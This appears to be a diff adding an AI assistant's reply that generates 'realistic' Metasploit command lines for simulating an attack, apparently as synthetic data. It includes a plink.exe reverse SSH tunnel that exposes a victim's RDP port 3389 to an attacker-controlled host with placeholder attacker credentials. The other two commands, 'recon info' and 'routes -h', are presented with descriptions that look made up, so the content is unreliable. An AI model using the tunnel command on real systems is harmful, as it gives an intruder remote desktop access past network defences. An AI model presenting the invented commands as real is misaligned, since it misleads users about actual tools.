@@ -1,0 +1,15 @@
+Based on the provided documentation, I will generate realistic command lines using Metasploit to simulate the attack behavior.
+
+**Command:** `recon info`
+
+This command is used to gather information about the network and simulate reconnaissance techniques.
+
+**Command:** `routes -h`
+
+This command is used to list available routes or active sessions in the network.
+
+**Command:** `plink.exe -pw "<attacker_ssh_user_password>" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`
+
+Please note that this command is using an external tool (plink) to simulate a connection, as per the provided documentation.
+
+Let me know if you need any further commands or assistance!
